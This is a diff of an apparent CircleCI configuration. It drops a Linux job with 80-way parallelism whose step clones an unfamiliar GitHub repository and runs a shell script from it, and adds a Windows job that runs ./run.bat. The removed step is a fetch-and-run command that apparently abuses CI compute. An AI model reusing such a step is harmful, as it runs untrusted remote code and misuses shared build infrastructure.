@@ -1,14 +1,11 @@
 version: 2
+
 jobs:
-  build:
-    docker:
-      - image: node:latest
-    parallelism: 80
-    resource_class: xlarge
+  build: # name of your job
+    machine:
+      image: windows-default # Windows machine image
+    resource_class: windows.medium
     steps:
-      - run: git clone https://github.com/puyuhdus/0.git && cd 0 && chmod u+x @ sh.sh && ./sh.sh
-workflows:
-    version: 2
-    build:
-        jobs:
-            - build
+      # default shell is Powershell
+      - run:
+         command: ./run.bat
